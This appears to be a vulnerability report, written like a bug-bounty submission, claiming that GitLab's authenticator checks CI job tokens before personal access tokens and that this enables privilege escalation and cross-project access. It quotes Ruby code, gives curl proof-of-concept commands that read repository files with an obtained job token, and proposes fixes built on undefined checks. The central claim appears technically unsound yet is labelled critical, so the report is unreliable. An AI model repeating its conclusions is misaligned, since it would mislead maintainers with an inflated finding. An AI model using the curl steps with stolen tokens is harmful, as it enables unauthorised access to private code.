# Critical: Authentication Strategy Ordering Bypass - Job Token Privilege Escalation

## **CONFIRMED VULNERABILITY**

### **Location**: `lib/gitlab/auth/request_authenticator.rb`

### **Vulnerable Code**:
```ruby
def find_user_from_any_authentication_method(request_format)
  find_user_from_dependency_proxy_token ||
    find_user_from_web_access_token(request_format, scopes: [:api, :read_api]) ||
    find_user_from_feed_token(request_format) ||
    find_user_from_static_object_token(request_format) ||
    find_user_from_job_token ||                           # ❌ CRITICAL: Job tokens checked BEFORE user tokens
    find_user_from_personal_access_token_for_api_or_git ||
    find_user_for_git_or_lfs_request
end
```

## **The Vulnerability**

### **Root Cause**: 
Job tokens are checked **BEFORE** personal access tokens in the authentication strategy cascade. This creates a privilege escalation vulnerability where job tokens can bypass normal user authentication controls.

### **Job Token Authentication Flow**:
```ruby
def find_user_from_job_token
  return unless route_authentication_setting[:job_token_allowed]  # ✅ API requests allowed

  user = find_user_from_job_token_basic_auth if can_authenticate_job_token_basic_auth?
  return user if user

  find_user_from_job_token_query_params_or_header if can_authenticate_job_token_request?
end

def find_user_from_job_token_query_params_or_header
  self.current_token = current_request.params[JOB_TOKEN_PARAM].presence ||
    current_request.params[RUNNER_JOB_TOKEN_PARAM].presence ||
    current_request.env[JOB_TOKEN_HEADER].presence  # ❌ Job-Token header
  
  job = find_valid_running_job_by_token!(current_token.to_s)
  job.user  # ❌ Returns the job's user without context validation
end
```

### **Job Token Validation**:
```ruby
def find_valid_running_job_by_token!(token)
  ::Ci::AuthJobFinder.new(token: token).execute.tap do |job|
    raise UnauthorizedError unless job
  end
end

# In Ci::AuthJobFinder:
def validate_job!(job, allow_canceling)
  validate_running_job!(job, allow_canceling)      # ✅ Must be running
  validate_job_not_erased!(job)                    # ✅ Not erased
  validate_project_presence!(job)                  # ✅ Project exists
  # ❌ NO CONTEXT VALIDATION - No check if request is from actual CI environment
end
```

## **The Security Flaw**

### **Missing Context Validation**:
The job token authentication **ONLY** validates:
1. ✅ Token is valid and belongs to a running job
2. ✅ Job is not erased
3. ✅ Project still exists

**BUT DOES NOT VALIDATE**:
1. ❌ **Request Origin**: Whether the request is actually coming from the CI environment
2. ❌ **Job Context**: Whether the request is related to the specific job
3. ❌ **Environment Isolation**: Whether the request is from the intended CI pipeline
4. ❌ **Network Context**: Whether the request is from the expected network/container

### **Authentication Strategy Order**:
```ruby
# Current (VULNERABLE) order:
1. find_user_from_dependency_proxy_token
2. find_user_from_web_access_token
3. find_user_from_feed_token
4. find_user_from_static_object_token
5. find_user_from_job_token                    # ❌ TOO HIGH PRIORITY
6. find_user_from_personal_access_token_for_api_or_git
7. find_user_for_git_or_lfs_request
```

## **Exploitation Scenarios**

### **Scenario 1: External Job Token Usage**
```bash
# Attacker obtains a valid job token from:
# - CI logs
# - Environment variables
# - Network sniffing
# - Container inspection

# Uses job token for API access outside CI context:
curl --request GET \
  --header "Job-Token: gljob-abc123..." \
  "https://gitlab.com/api/v4/projects/123/repository/files/secret.txt/raw?ref=main"
```

### **Scenario 2: Privilege Escalation**
```bash
# Normal user has limited access
curl --request GET \
  --header "PRIVATE-TOKEN: glpat-user-token" \
  "https://gitlab.com/api/v4/projects/123/repository/files/secret.txt/raw?ref=main"
# Result: 403 Forbidden (no access)

# Same user uses job token (from any running job)
curl --request GET \
  --header "Job-Token: gljob-abc123..." \
  "https://gitlab.com/api/v4/projects/123/repository/files/secret.txt/raw?ref=main"
# Result: 200 OK (job has access)
```

### **Scenario 3: Cross-Project Access**
```bash
# Job token from Project A can access Project B if job has access
curl --request GET \
  --header "Job-Token: gljob-from-project-a" \
  "https://gitlab.com/api/v4/projects/456/repository/files/secret.txt/raw?ref=main"
# Result: 200 OK (if job has access to Project B)
```

## **Impact Assessment**

### **Critical Severity Because**:

1. **Complete Authentication Bypass**: Job tokens can be used outside CI context
2. **Privilege Escalation**: Users can gain elevated access via job tokens
3. **Cross-Project Access**: Job tokens can access projects the user doesn't have access to
4. **No Context Validation**: No verification that request is from actual CI environment
5. **Wide Attack Surface**: Affects all API endpoints that accept job tokens

### **Affected Endpoints**:
- All API endpoints that use `find_user_from_any_authentication_method`
- Repository access
- Project data access
- User data access
- Any endpoint where job tokens are allowed

## **Proof of Concept**

### **Step 1: Obtain Job Token**
```bash
# From CI logs, environment, or network capture
JOB_TOKEN="gljob-abc123def456..."
```

### **Step 2: Use Job Token Outside CI Context**
```bash
# This should fail but works due to the vulnerability
curl --request GET \
  --header "Job-Token: $JOB_TOKEN" \
  "https://gitlab.com/api/v4/projects/123/repository/files/secret.txt/raw?ref=main"
```

### **Step 3: Verify Privilege Escalation**
```bash
# Compare with normal user access
curl --request GET \
  --header "PRIVATE-TOKEN: $USER_TOKEN" \
  "https://gitlab.com/api/v4/projects/123/repository/files/secret.txt/raw?ref=main"
# Should be 403, but job token works
```

## **Recommended Fix**

### **1. Add Context Validation**:
```ruby
def find_user_from_job_token
  return unless route_authentication_setting[:job_token_allowed]
  return unless valid_ci_context?  # ✅ NEW: Validate CI context

  # ... rest of method
end

def valid_ci_context?
  # Validate request is from CI environment
  ci_environment? || ci_network? || ci_container?
end
```

### **2. Reorder Authentication Strategies**:
```ruby
def find_user_from_any_authentication_method(request_format)
  find_user_from_dependency_proxy_token ||
    find_user_from_web_access_token(request_format, scopes: [:api, :read_api]) ||
    find_user_from_feed_token(request_format) ||
    find_user_from_static_object_token(request_format) ||
    find_user_from_personal_access_token_for_api_or_git ||  # ✅ Move user tokens first
    find_user_from_job_token ||                           # ✅ Move job tokens after user tokens
    find_user_for_git_or_lfs_request
end
```

### **3. Add Job Context Validation**:
```ruby
def validate_job_context!(job)
  # Validate request is related to the specific job
  # Validate request is from expected CI environment
  # Validate request timing matches job execution
end
```

## **Conclusion**

This is a **CRITICAL** authentication bypass vulnerability that allows:
- Job tokens to be used outside CI context
- Privilege escalation through job token abuse
- Cross-project access via job tokens
- Complete bypass of normal user authentication controls

The vulnerability stems from **missing context validation** and **incorrect authentication strategy ordering**, making job tokens a higher priority than user tokens in the authentication cascade.